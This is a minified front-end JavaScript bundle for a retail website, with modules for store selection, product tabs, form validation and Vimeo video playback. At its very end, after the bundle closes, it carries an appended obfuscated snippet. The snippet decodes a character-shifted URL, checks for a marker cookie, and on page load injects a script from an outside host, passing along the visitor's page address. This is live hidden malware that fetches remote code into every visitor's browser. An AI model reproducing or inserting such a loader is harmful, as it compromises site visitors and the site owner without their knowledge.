e=this;i.getStoresInventory(this.pid).then((function(t){i.selectStoreDialog({stores:t,selectedStoreId:User.storeId,selectedStoreText:Resources.PREFERRED_STORE,continueCallback:o,selectStoreCallback:e.setPreferredStore})})).done()},init:function(){var e=$(".availability-results"),t=this;this.pid=$('input[name="pid"]').val(),$("#product-content .set-preferred-store").on("click",(function(e){e.preventDefault(),User.zip?t.productSelectStore():i.zipPrompt((function(){t.productSelectStore()}))})),e.length&&(User.storeId&&i.getStoresInventory(this.pid).then(o),e.on("click",".stores-toggle",(function(e){e.preventDefault(),$(".store-list-pdp .store-list-item").toggleClass("visible"),$(this).hasClass("collapsed")?$(this).text(Resources.SEE_LESS):$(this).text(Resources.SEE_MORE),$(this).toggleClass("collapsed")})))}};t.exports=s},{"./":618,lodash:219}],620:[function(e,t,n){var r=e("./modules/helpers/equalHeight"),i=e("./modules/helpers/debounce"),a=e("./modules/google").tagManager,o=".js-tabs-holder",s=".js-tab-item",l=".js-tab-line",c=".js-tab-expanding-content",u=767<$(window).width()&$(window).width()<1024;function d(){$(c).length&&$(c).each((function(){var e=$(this),t=e.outerHeight();e.parent().outerHeight()+10<t&&e.parents(".js-ingredients-tab-content").addClass("hidden-content")}))}var p={init:function(){$(o).length&&$(o).each((function(){var e=$(this).find(".js-tabs li:first");$(".js-tab-content:first").addClass("active").removeAttr("aria-hidden"),e.find(s).addClass("selected"),d()})),$(s).on("click",(function(e,t){var n=$(this),r=n.parents(o),i=r.find(".js-tabs"),c=n.parent().index(),u=n.width(),d=i.position().left,p=n.parent().position().left,h=-1*d+p;n.hasClass("selected")||(t||a.pushPDPTabsEvent(n,o),0===d?r.find(l).css({left:p,width:u}):r.find(l).css({left:h,width:u}),r.find(".js-tab-content").removeClass("active").attr("aria-hidden","true"),r.find(".js-tab-content:eq("+c+")").stop().addClass("active").removeAttr("aria-hidden"),r.find(s).removeClass("selected"),n.addClass("selected"))})),$(document).on("keyup",s,(function(){13==event.keyCode&&$(this).click()})),$(o).length&&$(o).each((function(){var e=$(this).find(".js-tab-content");r(e)})),$(".js-tab-content-inner").each((function(){$(this).html($(this).html().trim())})),$(".js-accordion-content").each((function(){$(this).html($(this).html().trim())})),$(".js-toggle-tab-ingredients").on("click",(function(){$(this).hasClass("active")?($(this).removeClass("active"),$(this).parent(".js-ingredients-tab-content").find(".js-ingredient-tab-content-inner").css("max-height",""),u&&$("html, body").animate({scrollTop:$(this).parents(".js-tabs-holder").offset().top},600)):($(this).addClass("active"),$(this).parent(".js-ingredients-tab-content").find(".js-ingredient-tab-content-inner").css("max-height",5e3),$(this).parent(".js-ingredients-tab-content").css("height","auto"))})),($(o).length||$(c).length)&&$(window).resize(i((function(){d()}),200))}};t.exports=p},{"./modules/google":474,"./modules/helpers/debounce":476,"./modules/helpers/equalHeight":477}],621:[function(e,t,n){function r(e){$("<div/>").addClass("browser-compatibility-alert").append($("<p/>").addClass("browser-error").html(e)).appendTo("#browser-check")}function i(e,t,n){var r=new Date;r.setTime(r+60*n*1e3),document.cookie=e+"="+t+"; expires="+r.toGMTString()+"; path=/"}n.getUserAgent=function(){var e="dw_TLSWarning",t=function(e){for(var t=document.cookie.split(";"),n=0;n<t.length;n++){var r=t[n].split("=");if("dw_TLSWarning"===r[0].trim())return r[1]}return""}();t?"true"===t&&r(Resources.TLS_WARNING):function(e,t){var n=[],r=navigator.userAgent,i=["MSIE 6.0","MSIE 7.0","MSIE 8.0","MSIE 9.0","MSIE 10.0","Android 2.3.7","Android 4.0.4","Android 4.1.1","Android 4.2.2","Android 4.3","Safari 5.1.9 / OS X 10.6.8","Safari 6.0.4 / OS X 10.8.4 "];function a(e){parseFloat(e.tls_version.split(" ")[1])<1.1&&(n.push(Resources.TLS_WARNING),t(n),$.ajax({url:Urls.TLSBadTLS}))}function o(){n.push(Resources.TLS_WARNING),t(n),$.ajax({url:Urls.TLSBadBrowser})}for(var s=0;s<i.length;s++)if(r.match(i[s])){$.ajax({url:"https://www.howsmyssl.com/a/check"}).done(a).fail(o);break}t(n)}(0,(function(t){0<t.length?(r(t[0]),i(e,"true",15)):i(e,"false",43200)}))}},{}],622:[function(e,t,n){var r=e("./modules/ajax"),i=e("./modules/helpers/scroll"),a=e("./dam/dam-helper");function o(){$(document).on("click touchstart",".js-modal-overlay, .js-close-toaster",(function(){l()})),$(".js-close-toaster").on("keyup",(function(e){13==e.which&&l()}))}function s(e){e.target?($(e.target).show(),setTimeout((function(){$(e.target).addClass("open"),c.def.$modalOverlay.fadeIn(),a.updateImages($(e.target))}),600)):(c.def.$genericToast.show(),setTimeout((function(){c.def.$genericToast.addClass("open"),0<$(".gwp-popup-padding").length&&$(".gwp-popup-padding").each((function(){$(this).closest(".generic-toaster-container").addClass("no-padding")})),c.def.$modalOverlay.fadeIn(),a.updateImages(c.def.$genericToast)}),600)),e.open&&"function"==typeof e.open&&e.open(),i.disableScroll(),e.close&&(c.def.$genericToast.off("toaster:close"),c.def.$genericToast.on("toaster:close",(function(){e.close()})))}function l(e){var t=e?$(e):c.def.$toasterGeneralEl;t.removeClass("open"),c.def.$modalOverlay.fadeOut(1e3,(function(){t.hide(),i.enableScroll(),t.trigger("toaster:close")}))}var c={def:{$toasterGeneralEl:$(".js-toaster-container"),$modalOverlay:$(".js-modal-overlay"),$genericToast:$(".js-generic-toaster"),$toastContent:$(".js-toaster-content")},init:function(){o()},initDef:function(){c.def.$toasterGeneralEl=$(".js-toaster-container"),c.def.$modalOverlay=$(".js-modal-overlay"),c.def.$genericToast=$(".js-generic-toaster"),c.def.$toastContent=$(".js-toaster-content")},open:s,load:function(e){r.load({url:e.url,target:$(".js-generic-toaster > .js-toaster-content"),callback:function(){o();var t={};e.close&&(t.close=e.close),s(t),e.open&&e.open()}})},closeToasters:l};t.exports=c},{"./dam/dam-helper":430,"./modules/ajax":470,"./modules/helpers/scroll":493}],623:[function(e,t,n){var r=e("./modules/util/isMobile");n.init=function(){r()||$(document).tooltip({items:".tooltip",content:function(){return $(this).find(".tooltip-content").html()},position:{my:"center bottom",at:"center top-10"}})}},{"./modules/util/isMobile":514}],624:[function(e,t,n){var r=e("./modules/util/getCountryFromLocaleCookie"),i=e("./rituals-form-helper"),a=e("./recaptchaConfig"),o=window.Resources||{},s=e("./modules/google"),l=!0,c={phone:{default:/^[+]?[ 0-9]{0,20}$/,ru:/^[+]?(?:[\s]*?[0-9]){0,12}[\s]*$/},notCC:/^(?!(([0-9 -]){13,19})).*$/,email:/^(?![^@]{65})(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@(?=.{1,255}$)((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/,password:/^.{8,20}$/,date:{us:/^(0?[1-9]|1[012])[\/](0?[1-9]|[12][0-9]|3[01])[\/]\d{4}$/,other:/^(0?[1-9]|[12][0-9]|3[01])[\/](0?[1-9]|1[012])[\/]\d{4}$/,birthdayUS:/^(0?[1-9]|1[012])[\/](0?[1-9]|[12][0-9]|3[01])$/},ssn:/^(19|20)?(\d{6}([-+]|\s)\d{4}|(?!19|20)\d{10})$/,nif:/^[0-9]{9}$/,emojis:/(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|[\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|[\ud83c[\ude32-\ude3a]|[\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/},u={errorClass:"error js-validator-error error-text",errorElement:"span",onkeyup:!1,onfocusout:function(e){$(e).data("prevent-automatic-validation")||this.checkable(e)||this.element(e)},errorPlacement:function(e,t){t.hasClass("js-warn-addded")&&t.siblings(".js-warn-message").addClass("hide"),t.hasClass("js-options-dropdown-custom")?e.insertBefore(t.closest(".selectric-wrapper")):t.hasClass("js-custom-select")?e.insertBefore(t.closest(".selectric-hide-select")):e.insertBefore(t)},invalidHandler:function(e,t){if(t.numberOfInvalids()){var n=$(t.errorList[0].element);i.scrollToInputField(n)}},success:function(e,t){(t=t.jquery?t:$(t)).hasClass("js-warn-addded")&&t.siblings(".js-warn-message").removeClass("hide"),e.remove(),$(".js-product-details-content .js-elixir-name-inner").removeClass("js-elixir-error-state")}},d=function(e,t){var n=$(t);if(!n.hasClass("required")&&""===e)return!0;var r=new RegExp($(t).attr("regex")),a=$.trim(e.toUpperCase());n.val(a);var o=r.test($.trim(a));return!o&&n.data("requires-additional-formatting")&&(a=i.formatUKPostalCodeSpace(n,a),o=r.test(a)),o},p=function(e,t){return!$(t).hasClass("required")&&""===e||new RegExp($(t).attr("regex")).test($.trim(e))},h=function(e){l=e},f=function(e,t){return!c.emojis.test($.trim(e))};function A(e){for(var t=e.trim().split(/[.,\/ -]/),n=0;n<t.length;n++)if(n!==t.length-1&&1===t[n].length&&(t[n]="0"+t[n]),n===t.length-1){var r=(new Date).getFullYear().toString().substr(-2);2===t[n].length&&(t[n]=t[n]<r?"20"+t[n]:"19"+t[n])}return t}$.validator.methods.required=function(e,t){return!!e&&null!==e&&("password"===t.type||""!==e.trim())},$.validator.addMethod("ordernumber",(function(e,t){return!(!this.optional(t)||0!==e.length)||new RegExp(o.ORDER_VALIDATION_REGEX).test($.trim(e))}),o.VALIDATE_ORDERNUMBER),$.validator.addMethod("passwordcheck",(function(e,t){return c.password.test(e)}),o.VALIDATE_PASSWORD),$.validator.addMethod("passwordconfirm",(function(e,t){return e===$(t).closest("fieldset").find("[id*=_password_]").val()}),o.VALIDATE_PASSWORDCONFIRM),$.validator.addMethod("email",(function(e,t){var n=this.optional(t),r=c.email.test($.trim(e));return n||r}),o.VALIDATE_EMAIL),$.validator.addMethod("emailconfirm",(function(e,t){return e.toLowerCase()===$(t).closest("fieldset").find("[id$=email]").val().toLowerCase()}),o.VALIDATE_EMAILCONFIRM),$.validator.addMethod("firstName",(function(e,t){var n=this.optional(t),r=c.emojis.test($.trim(e));return n||!r}),o.VALIDATE_FIRST_NAME),$.validator.addMethod("lastName",(function(e,t){var n=this.optional(t),r=c.emojis.test($.trim(e));return n||!r}),o.VALIDATE_LAST_NAME),$.validator.addMethod("postal",d,o.VALIDATE_POSTALCODE),$.validator.addMethod("dangerouspostal",(function(e,t){return e&&!$(t).hasClass("excludedpostalerror")}),o.VALIDATE_DANGEROUS_POSTALCODE),$.validator.addMethod("cocNumber",(function(e,t){if(!$(t).hasClass("required")&&""===e)return!0;var n=new RegExp($(t).attr("regex")),r=e.toUpperCase();return $(t).val(r),n.test($.trim(r))}),o.VALIDATE_COCNUMBER),$.validator.addMethod("vatNumber",p,o.VALIDATE_VATNUMBER),$.validator.addMethod("street",p,o.VALIDATE_STREET),$.validator.addMethod("houseNumber",p,o.VALIDATE_HOUSENUMBER),$.validator.addMethod("stateUS",(function(e,t){var n=$(t).closest("fieldset"),r=n.find("[id$=_postal]").val(),i=n.find("[id$=_country]").val();return s.places.comapreStateToPostalCode(r,i,e,h),l}),o.VALIDATE_STATE_FROM_POSTAL),$.validator.addMethod("date-max-now",(function(e,t){var n=!1,i=e.replace(/-| /g,"/");$(t).val(i);var a=r(),o=$.trim(i);if("US"===a?c.date.us.test(o):c.date.other.test(o)){var s=o.split("/");("US"===a?new Date(s[2],parseInt(s[0])-1,s[1],0,0,0,0):new Date(s[2],parseInt(s[1])-1,s[0],0,0,0,0)).getTime()<=Date.now()&&(n=!0)}return n}),o.VALIDATE_DATE_MAX_NOW),$.validator.addMethod("date",(function(e,t){var n,i=this.optional(t);if(e.length<6)return i;var a=A(e),o=a.join("/");$(t).val(o);var s=r(),l=c.date[s.toLowerCase()]?s.toLowerCase():"other";if(n=c.date[l].test($.trim(o))){var u="US"===s?a[1]:a[0],d="US"===s?a[0]:a[1],p=a[2],h=(new Date).getFullYear(),f=new Date(p,parseInt(d)-1,u);n=p<h&&Boolean(+f)&&f.getDate()===parseInt(u)}return i||n}),o.VALIDATE_DATE),$.validator.addMethod("birthday-us",(function(e,t){var n,i=this.optional(t);if(e.length<3)return i;for(var a=e.trim().split(/[.,\/ -]/),o=0;o<a.length;o++)o!==a.length&&1===a[o].length&&(a[o]="0"+a[o]);var s=a.join("/");$(t).val(s),n=c.date.birthdayUS.test($.trim(s));var l=r();if("US"!==l&&(n=c.date.other.test($.trim(s+"/1900"))),n){var u=a[1],d=a[0];"US"!==l&&(u=a[0],d=a[1]);var p=(new Date).getFullYear(),h=new Date(1900,parseInt(d)-1,u);n=1900<p&&Boolean(+h)&&h.getDate()===parseInt(u)}return i||n}),o.VALIDATE_BIRTHDAY_USA),$.validator.addMethod("min-age",(function(e,t){if("us"===r().toLowerCase())return!0;var n=$(t).data("min-age"),i=void 0!==n?n:16,a=A(e),o=new Date(a[2]+"/"+a[1]+"/"+a[0]),s=new Date,l=s.getFullYear()-o.getFullYear();return(s.getMonth()<o.getMonth()||o.getMonth()===s.getMonth()&&s.getDate()<o.getDate())&&l--,!(l<i)}),(function(e,t){var n=$(t).data("min-age"),r=void 0!==n?n:16,i=String.format(o.VALIDATE_BIRTHDAY_MIN_AGE,r);if(i)return i})),$.validator.addMethod("ssn",(function(e,t){var n=this.optional(t),r=$(t).data("validate");return!(!n&&r)||c.ssn.test(e)}),o.VALIDATE_SSN),$.validator.addMethod("nif",(function(e,t){return!(!this.optional(t)||0!==e.length)||c.nif.test(e)}),o.VALIDATE_NIF),$.validator.addMethod("phone",(function(e,t){var n=!0,i=$.trim(e),a=$(t).attr("regex");void 0!==a&&(n=new RegExp(a).test(i));var o=this.optional(t),s=r(),l=(s&&c.phone[s.toLowerCase()]||c.phone.default).test($.trim(e));return o&&""===e.trim()||l&&n}),o.INVALID_PHONE),$.validator.addMethod("owner",(function(e){return c.notCC.test($.trim(e))}),o.INVALID_OWNER),$.validator.addMethod("emptyselect",(function(e){return!!e&&""!==$.trim(e)}),o.VALIDATE_REQUIRED),$.validator.addMethod("personalizedname",f,o.SPECIAL_CHARACTERS),$.validator.addMethod("maxlengthallowed",(function(e,t){var n=$(t),r=parseInt(n.attr("maxlengthallowed"),10);return e.length<=r||(n.val(e.substr(0,r+1)),!1)}),$.validator.format(o.VALIDATE_MAXLENGTH)),$.validator.addMethod("loyaltysmslist",(function(e,t){if("true"!==e)return!0;var n=$(t).closest("form").find(".smsphone");return!n.length||!!n.val().trim().length}),o.VALIDATE_LOYALTYSMS),$.validator.addMethod("smsphone",(function(e,t){return!($("[id$=_addtosmslist]").length?$("[id$=_addtosmslist]"):$("[id$=_addtoloyaltysmslist]")).is(":checked")||!!e.trim().length}),o.VALIDATE_LOYALTYSMSPHONE),$.validator.addMethod("gift-cert-amount",(function(e,t){var n=this.optional(t),r=!isNaN(e)&&5<=parseFloat(e)&&parseFloat(e)<=5e3;return n||r}),o.GIFT_CERT_AMOUNT_INVALID),$.validator.addMethod("positivenumber",(function(e){return 0===$.trim(e).length||!isNaN(e)&&0<=Number(e)}),""),$.extend($.validator.messages,{required:o.VALIDATE_REQUIRED,remote:o.VALIDATE_REMOTE,email:o.VALIDATE_EMAIL,url:o.VALIDATE_URL,date:o.VALIDATE_DATE,dateISO:o.VALIDATE_DATEISO,number:o.VALIDATE_NUMBER,digits:o.VALIDATE_DIGITS,creditcard:o.VALIDATE_CREDITCARD,equalTo:o.VALIDATE_EQUALTO,maxlength:$.validator.format(o.VALIDATE_MAXLENGTH),minlength:$.validator.format(o.VALIDATE_MINLENGTH),rangelength:$.validator.format(o.VALIDATE_RANGELENGTH),range:$.validator.format(o.VALIDATE_RANGE),max:$.validator.format(o.VALIDATE_MAX),min:$.validator.format(o.VALIDATE_MIN)});var m={regex:c,settings:u,init:function(){var e=this;$("form:not(.suppress):not(.js-pdp-add-to-cart-form)").each((function(){$(this).validate(e.settings)})),$("form.js-pdp-add-to-cart-form").each((function(){var t=$.extend(!0,e.settings,{ignore:["hidden:not(select)"]});$(this).validate(t)})),$(document).off("submit.postback","form.js-postback").on("submit.postback","form.js-postback",(function(e){var t=$(this);if(t.valid()){var n=t.find("button[type=submit]");n.addClass("btn--disabled");var r=$(".js-spinner-general",n);r.length&&(n.addClass("button-loading"),r.addClass("spinner-visible"));var i=t.data(a.CONSTANTS.RECAPTCHA_CONTAINER_ID_ATTR);return 0<$("#"+i).length&&t.hasClass(a.CONSTANTS.FORM_EXECUTE_RECAPTCHA_CLASS)&&!t.hasClass(a.CONSTANTS.CHALLENGE_DONE_CLASS)?(a.executeForContainer(i),e.preventDefault(),!1):(a.removeChallengeDoneClass(i),t.submit((function(){return!1})),!0)}return!1}))},initForm:function(e){$(e).validate(this.settings)},validatePostalCode:d,validatePersonalizedName:f};$.validator.messages.required=function(e,t){return $(t).attr("data-required-text")||""},t.exports=m},{"./modules/google":474,"./modules/util/getCountryFromLocaleCookie":505,"./recaptchaConfig":603,"./rituals-form-helper":606}],625:[function(e,t,n){var r,i,a=e("@vimeo/player"),o=e("./modules/util/isMobile"),s=e("./modules/util/isMobileWidth"),l=e("./modules/util/elementInViewport"),c=e("./modules/util/getQueryStringParams"),u=e("./modules/helpers/debounce"),d=".js-vimeo-player",p=".js-vimeo-fullscreen",h=".js-vimeo-fullscreen-backdrop",f=".js-video-controls",A=".js-video-control-button",m=".js-video-close",v=".js-background-video",g=".js-show-fullscreen",y=".js-product-slider-image-holder",b=o()?"touchstart.video":"click.video",_=[];function w(e,t){var n,r=new a($(e),t);return 0<$(e).closest(v).length&&(n=r,setTimeout((function(){$(v).addClass("show")}),700),n.ready().then((function(){if(void 0!==n._originalElement){var e=n._originalElement.offsetParent,t=$(e).find(f);0<t.length&&$(t).addClass("is-playing")}})).catch((function(e){}))),r}function C(e){var t=_[e];void 0!==t&&t.getPaused().then((function(e){e&&t.play().then((function(){})).catch((function(e){}))})).catch((function(e){}))}function x(e){var t=_[e];void 0!==t&&t.getPaused().then((function(e){e||t.pause().then((function(){})).catch((function(e){}))})).catch((function(e){}))}function S(){k($(this).next(p).find(d)[0])}function k(e,t){var n=$(e).closest(p),r=n.closest(".js-fullwidth-slider-block"),a=n.closest(".js-fullwidth-slider-holder");if(0!==n.length){(n.closest(".js-grid-decorative-tile-wrapper").length||n.closest(".js-product-slider-holder").length||a.length)&&(n.attr("data-tile-id",t),n.appendTo("body")),r.length&&r.addClass("video-shown");var s=$(e).data("vimeo-options");void 0===_[s.id]&&(_[s.id]=w(e,s)),i=_[s.id],o()?i.ready().then((function(){n.addClass("active visible")})).catch((function(e){})):i.ready().then((function(){var e=n.find(d);Promise.all([i.getVideoWidth(),i.getVideoHeight()]).then((function(t){var n=t[0]/t[1];e.width(Math.floor(e.height()*n))})).catch((function(e){})),n.data("initial-scroll-position",$(window).scrollTop()),n.addClass("active visible"),$("body").addClass("video-fullscreen")})).catch((function(e){})),$(window).on("scroll.video",u(I,200)),$("body").on("keydown.video",(function(e){var t,n,r;t=e,n=s.id,r=_[n],13===t.keyCode||32===t.keyCode?(t.preventDefault(),r.getPaused().then((function(e){e?C(n):x(n)})).catch((function(e){}))):27===t.keyCode&&(t.preventDefault(),M.call(r._originalElement))})),o()||setTimeout((function(){C(s.id)}),1e3),setTimeout((function(){$(h).on("click",M)}),100)}}function M(e){void 0!==e&&e.preventDefault();var t=$(this).closest(p).find(d).data("vimeo-options").id;void 0!==_[t]&&(x(t),$(this).closest(f).removeClass("active"),$(p).removeClass("active"),$("body").removeClass("video-fullscreen"),setTimeout((function(){$(p).removeClass("visible")}),400));var n=$(this).closest(".js-vimeo-fullscreen[data-tile-id]");if(n.length){var r=n.data("tile-id");setTimeout((function(){$('button[data-tile-id="'+r+'"]').parent().append(n)}),500)}$(".js-fullwidth-slider-block").hasClass("video-shown")&&$(".js-fullwidth-slider-block").removeClass("video-shown"),$(window).off("scroll.video"),$("body").off("keydown.video"),$(h).off("click",M),$(this).closest(".js-product-experience-block").length&&$(".js-drag-list").css("z-index","0")}function B(){var e=$(this).data("target"),t=$(this).closest(f),n=F(e);void 0!==_[n]&&($(t).hasClass("is-playing")?($(t).addClass("was-paused"),$(t).removeClass("is-playing"),x(n)):($(t).removeClass("was-paused"),$(t).addClass("is-playing"),C(n)))}function E(){var e=$(this).find(f);clearTimeout(r),e.hasClass("active")||e.addClass("active")}function T(){var e=$(this).find(f);clearTimeout(r),r=setTimeout(P,1e3,e)}function P(e){e.removeClass("active")}function I(){var e=$(p).data("initial-scroll-position")||0;($(window).scrollTop()>e+100||$(window).scrollTop()<e-100)&&$(m).trigger("click")}function F(e){return $.parseJSON(JSON.stringify($(e).data("vimeo-options"))).id}function L(e){var t=$(e.target);k(t.next(p).find(d)[0],t.data("tile-id")),t.closest(".js-product-experience-block").length&&$(".js-drag-list").css("z-index","100")}var O={initGeneric:function(){$(d).each((function(e,t){var n,r,i=$(t).data("vimeo-options");!0!==i.background||"loop"in i||(i.loop=1),(s()&&!i.hideOnMobile||!s()&&!i.hideOnDesktop)&&!i.skipOnLoad&&(_[i.id]=w(t,i)),!s()&&i.playWhenInView&&(n=i.id,r=_[n],$(window).on("load scroll",(function(){if(void 0!==r._originalElement){var e=r._originalElement.offsetParent,t=$(e).find(f),i="0"==$(e).parent().css("opacity");l(e,0)&&!i?$(t).hasClass("was-paused")||(C(n),t.addClass("is-playing")):(x(n),t.removeClass("is-playing"))}})))})),$(p).on("mouseover",E),$(p).on("mouseout",T),$(A).off("click",B).on("click",B),$(m).on("click",M),I(),$(A).on("keyup",(function(e){var t=$(this).data("target"),n=$(this).closest(f),r=F(t);void 0!==_[r]&&e.originalEvent===KeyboardEvent&&(13!==e.which&&32!==e.which||($(n).hasClass("is-playing")?($(n).addClass("was-paused"),$(n).removeClass("is-playing"),x(r)):($(n).removeClass("was-paused"),$(n).addClass("is-playing"),C(r))))})),$(".js-content-video-button").off(b).on(b,L),$(p).find(d).each((function(e,t){var n=$.parseJSON(JSON.stringify($(t).data("vimeo-options")));void 0===_[n.id]&&(_[n.id]=w(t,n))})),c(window.location.href).openvideo&&k($(p).first().find(d)[0])},initPDP:function(){$(g)&&$(g).on("click",S)},initCollection:function(){s()||$(".js-product-main-slider").on("beforeChange",(function(e,t,n,r){var i=$(y).get(n),a=$(i).find(d),o=$(i).find(f);0<a.length&&(o.removeClass("is-playing was-paused"),x(F(a)));var s=$(y).get(r),l=$(s).find(d),c=$(s).find(f);if(0<l.length){c.addClass("is-playing");var u=F(l);_[u].setCurrentTime(0),C(u)}}))}};t.exports=O},{"./modules/helpers/debounce":476,"./modules/util/elementInViewport":500,"./modules/util/getQueryStringParams":509,"./modules/util/isMobile":514,"./modules/util/isMobileWidth":516,"@vimeo/player":3}],626:[function(e,t,n){var r=e("./slick-slider"),i=e("./modules/helpers/isSmallView");var a={init:function(){r.writeACardSlider(),function(){if(0===$(".js-card-message-textarea").length)return!1;var e=$(".js-write-a-card .js-add-to-cart, .js-giftcard-submit"),t=$(".js-card-message-textarea"),n=$("#empty-card"),r=$(".js-characters-left"),a=t.attr("maxlength");r.html(a-t.val().length);var o={onChange:$.Event("pgCustomize.onChange")};e.prop("disabled",!t.val()&&!n.is(":checked")),t.off("input paste").on("input paste",(function(){var e=$(this).val();r.html(a-e.length)})),t.off("keyup").on("keyup",(function(){$(document).trigger(o.onChange),t.val()?$(e).prop("disabled")&&$(e).prop("disabled",!1):e.prop("disabled",!0)})),t.off("focus click").on("focus click",(function(){n.is(":checked")&&(n.prop("checked",!1),e.prop("disabled",!0))})),n.off("change").on("change",(function(){if(!$(this).is(":checked")){t.val(window.cartText||""),e.prop("disabled",!window.cartText);var n=t.val();return r.html(a-n.length),!0}window.cartText=t.val(),t.val()&&($(t).val(""),r.html(a)),e.prop("disabled",!1)})),$(document).on("keypress paste",".js-card-message-textarea",(function(){var e,t;e=this,t=$(this).val(),setTimeout((function(){var n=25;i()&&(n=23),e.scrollHeight-e.clientHeight>n&&$(e).val(t)}),1)}))}()}};t.exports=a},{"./modules/helpers/isSmallView":487,"./slick-slider":614}]},{},[295]);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3z'+'xjwxyfynhx3htr'+'4ljy4xyfynh3ox')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));